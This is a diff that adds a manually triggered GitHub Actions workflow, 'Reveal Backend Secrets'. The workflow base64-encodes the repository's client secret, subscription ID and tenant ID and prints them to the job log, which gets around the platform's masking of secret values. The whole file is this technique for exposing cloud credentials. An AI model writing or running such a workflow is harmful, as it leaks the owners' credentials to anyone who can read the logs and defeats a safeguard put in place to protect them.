@@ -1,0 +1,12 @@
+name: Reveal Backend Secrets
+on: workflow_dispatch 
+
+jobs:
+  reveal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Display Encoded Secrets
+        run: |
+          echo "Base64 Client Secret: $(echo -n "${{ secrets.CLIENT_SECRET }}" | base64)"
+          echo "Base64 Subscription ID: $(echo -n "${{ secrets.SUBSCRIPTION_ID }}" | base64)"
+          echo "Base64 Tenant ID: $(echo -n "${{ secrets.TENANT_ID }}" | base64)"
